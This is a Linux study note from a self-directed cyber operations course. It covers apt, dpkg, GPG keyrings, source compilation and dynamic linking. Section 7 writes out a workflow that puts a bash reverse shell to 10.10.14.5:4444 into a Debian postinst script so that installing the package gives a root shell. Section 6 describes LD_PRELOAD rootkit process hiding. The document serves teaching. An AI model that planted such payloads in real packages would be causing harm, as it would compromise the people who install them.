<!-- =========================================================================
   PROJECT: IW Cyber Ops — Knowledge Base (Intelligence Vault)
   AUTHOR: Muhammad Imran | IW Cyber Ops (@iwcyberops)
   TRACK: 42-Month Systems & Cyber Operations Research
   MODULE: Month 01 — Linux Kernel Interface & Core CLI
   DOCUMENT: Day 12 — Package Management, Compilation & Dynamic Linking
   ========================================================================= -->

# 🛡️ Day 12: Package Management, Compilation & Dynamic Linking

> **IW Cyber Ops Research Vault | Module 01: Linux & Systems Foundations**  
> *Author: Muhammad Imran (@iwcyberops)*  
> *Track: Debian Packaging, Toolchain Pipeline, Shared Objects & LD_PRELOAD Hooks*

---

## 1. Software Distribution Architecture in Linux

Software in Linux exists in three states: **Remote Repositories** (managed via high-level package solvers), **Debian Archives (`.deb`)** (managed via low-level package engines), and **Raw Source Code** (compiled directly into native ELF binaries).

```
 ┌───────────────────────────┐
 │   Remote APT Repository   │ ──( apt update / install )──┐
 └───────────────────────────┘                             │
                                                           ▼
 ┌───────────────────────────┐                    ┌──────────────────┐
 │ Local .deb Package File   │ ──( dpkg -i )────> │ System Binaries  │ <── [ Compiled ELF ]
 └───────────────────────────┘                    │ (/usr/bin, /bin) │      (gcc / make)
                                                  └────────┬─────────┘
                                                           │
                                                           ▼
                                                  ┌──────────────────┐
                                                  │ Shared Libraries │
                                                  │ (/lib, /usr/lib) │
                                                  └──────────────────┘
```

---

## 2. High-Level Package Management: `apt` Suite

`apt` (Advanced Package Tool) automates dependency resolution, package fetching over HTTP/HTTPS, cryptographic signature verification, and installation via `dpkg`.

### `apt` & `apt-cache` Command Reference

```bash
# 1. Repository Synchronization & Upgrades
sudo apt update                       # Resynchronize package index files from sources
sudo apt upgrade -y                   # Install available upgrades of all packages without removing existing
sudo apt full-upgrade -y              # Upgrade system, removing conflicting packages if necessary (Kali standard)

# 2. Package Installation & Removal
sudo apt install nmap -y              # Download and install package with all dependencies
sudo apt install --reinstall nmap     # Reinstall corrupted/broken package
sudo apt remove nmap                  # Remove binary files (Preserves configuration files)
sudo apt purge nmap                   # Completely purge package AND all associated configuration files
sudo apt autoremove --purge           # Remove orphaned dependencies no longer required by any package

# 3. Package Reconnaissance & Querying (apt-cache)
apt-cache search "sql injection"      # Search package descriptions for keywords
apt-cache show nginx                  # Display detailed package metadata, maintainer, and dependencies
apt-cache policy openssh-server       # Display installed version, candidate version, and repo priority/pinning
apt-cache depends wireshark           # List direct tree dependencies of a package
```

---

## 3. Low-Level Package Surgery: `dpkg`

`dpkg` is the underlying package manager for Debian-based distributions. It directly manipulates `.deb` files on the local filesystem **without resolving external network dependencies**.

### `dpkg` Practical CLI Operations

```bash
# 1. Local Package Installation & Extraction
sudo dpkg -i payload.deb              # Unpack and configure local .deb package
sudo dpkg -r package_name             # Remove package (Keeps configs)
sudo dpkg -P package_name             # Purge package completely

# 2. Filesystem & Binary Auditing
dpkg -l                               # List all installed packages with version and architecture
dpkg -l | grep -i "apache"            # Search installed package database
dpkg -L openssh-server                # List every file and directory installed on disk by this package
dpkg -S /bin/ls                       # Reverse Lookup: Find which package owns this exact binary file
dpkg -c package.deb                   # Inspect contents of a .deb archive without installing it
```

---

## 4. Repository Infrastructure & GPG Keyrings

APT repositories are configured in `/etc/apt/sources.list` and `/etc/apt/sources.list.d/*.list`.

```text
deb [signed-by=/etc/apt/keyrings/kali.gpg] http://http.kali.org/kali kali-rolling main contrib non-free
 │                     │                               │                 │           └── Components
 │                     │                               │                 └────────────── Distribution/Suite
 │                     │                               └──────────────────────────────── Mirror URL
 │                     └──────────────────────────────────────────────────────────────── GPG Key Verification Path
 └────────────────────────────────────────────────────────────────────────────────────── Archive Type (deb / deb-src)
```

### Modern GPG Trust Model
Legacy `apt-key add` is deprecated due to global trust vulnerabilities. Modern distributions isolate cryptographic keys in dedicated keyrings:

```bash
# Secure GPG Keyring Import:
curl -fsSL https://download.docker.com/linux/debian/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg

# Reference key directly inside sources.list:
echo "deb [arch=amd64 signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/debian bookworm stable" | sudo tee /etc/apt/sources.list.d/docker.list
```

---

## 5. Building Binaries from Source Code (The Toolchain Pipeline)

Compiling applications from source provides performance optimizations, custom build flags, and unconstrained binary weaponization.

### The C/C++ Compilation Pipeline

```
 [ Source Code (.c) ] ──> [ Preprocessor ] ──> [ Compiler ] ──> [ Assembler ] ──> [ Linker ] ──> [ ELF Binary ]
```

---

### The Standard GNU Build System (`Autotools`)

```bash
# Step 1: Install Core Development Toolchain
sudo apt install build-essential gcc g++ make cmake -y

# Step 2: Extract Source Tarball
tar -xzf exploit-source.tar.gz && cd exploit-source/

# Step 3: Configure (Inspects environment, dependencies & architectures)
./configure --prefix=/opt/custom_tool --enable-static

# Step 4: Compile (Executes Makefile instructions)
make -j$(nproc)                       # Compile utilizing all available CPU cores

# Step 5: Install (Copies compiled binaries to system paths)
sudo make install
```

---

### Direct Compilation with GCC & Stripping

```bash
# 1. Standard ELF Binary Compilation
gcc -Wall -Wextra -O2 payload.c -o payload

# 2. Static Binary Compilation (Bundles all C runtime libraries into the binary)
gcc -static payload.c -o payload_static
# Advantage: Executes on any target Linux machine without missing dependency errors.

# 3. Binary Stripping (Anti-Analysis / Size Reduction)
strip --strip-all payload             # Strips symbol tables, debug markers, and function names
```

---

## 6. Shared Objects & Dynamic Linker Internals (`ldd`, `ld.so`)

Modern Linux executables are **Dynamically Linked** to reduce memory footprint. At runtime, the Dynamic Linker (`/lib64/ld-linux-x86-64.so.2`) maps required **Shared Objects (`.so`)** into process memory.

```bash
# Inspect Dynamic Library Dependencies of a Binary
ldd /bin/bash
# Output:
#   linux-vdso.so.1 =>  (0x00007fff...)
#   libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f...)
#   /lib64/ld-linux-x86-64.so.2 => (0x00007f...)

# Refresh Dynamic Linker Cache after installing custom libraries
sudo ldconfig
```

---

### 🔴 Red Team & Rootkit Vector: `LD_PRELOAD` Hooking

`LD_PRELOAD` is an environment variable that forces the dynamic linker to load specified shared libraries **before** any standard system libraries (including `libc`).

```
┌────────────────────────────────────────────────────────┐
│               STANDARD EXECUTION FLOW                  │
│ Process Call ───> [ libc.so (Standard Implementation) ]│
└────────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────────┐
│             LD_PRELOAD HIJACKED EXECUTION              │
│ Process Call ───> [ evil.so (Malicious Hook) ] ───> libc│
└────────────────────────────────────────────────────────┘
```

#### Weaponization Mechanics:
1. An attacker writes a C library intercepting `getuid()`, `fopen()`, or `readdir()`.
2. The library is added to `/etc/ld.so.preload` (system-wide persistence) or exported via `export LD_PRELOAD=/path/to/evil.so`.
3. When monitoring tools like `ps` or `top` query process trees via `readdir()`, the malicious library intercepts the call and filters out rogue attacker PIDs (Process Hiding).

---

## 7. Malicious Debian Package Weaponization

Debian packages contain control scripts that execute with absolute **root privileges** during installation:
* `preinst` (Executes before files are unpacked)
* `postinst` (Executes immediately after installation)

```
                       ┌───────────────────────────────────────┐
                       │          .deb PACKAGE ANATOMY         │
                       ├───────────────────────────────────────┤
                       │ - debian-binary (Version string)      │
                       │ - control.tar.gz (Metadata & Scripts) │
                       │    ├── control (Package info)         │
                       │    ├── preinst (Pre-install bash)     │
                       │    └── postinst (Post-install bash)   │ ──> [ ROOT REVERSE SHELL ]
                       │ - data.tar.gz (Physical files)        │
                       └───────────────────────────────────────┘
```

```bash
# Offensive Weaponization Workflow:
# Step 1: Inject payload into postinst script
echo '#!/bin/bash' > postinst
echo 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1 &' >> postinst
chmod 755 postinst

# Step 2: Repackage into weaponized installer
# When the victim runs: sudo dpkg -i legitimate_looking.deb
# The postinst triggers an immediate root shell to the attacker.
```

---

## 8. Package & Build Operations Matrix

| Objective | Command Syntax | Tactical / Security Context |
| :--- | :--- | :--- |
| **Reverse Locate Binary Package** | `dpkg -S /path/to/binary` | Trace source package of unknown executables |
| **Extract `.deb` Without Installing** | `dpkg-deb -x target.deb /tmp/unpacked/` | Inspect raw binaries without triggering scripts |
| **Audit Preload Hijacks** | `cat /etc/ld.so.preload 2>/dev/null` | Identify active Userland rootkit hooks |
| **Check Shared Dependencies** | `ldd -v /bin/login` | Verify binary integrity and linked libraries |
| **Force Source Build Threads** | `make -j$(nproc)` | Optimize compilation time across all cores |
| **Clean Orphaned Packages** | `sudo apt autoremove --purge` | Remove redundant attack surface on hosts |

---

<!-- =========================================================================
   [IW CYBER OPS] - INTERNAL RESEARCH USE ONLY
   Repository: https://github.com/iwcyberops/IW-Knowledge-Base
   ========================================================================= -->
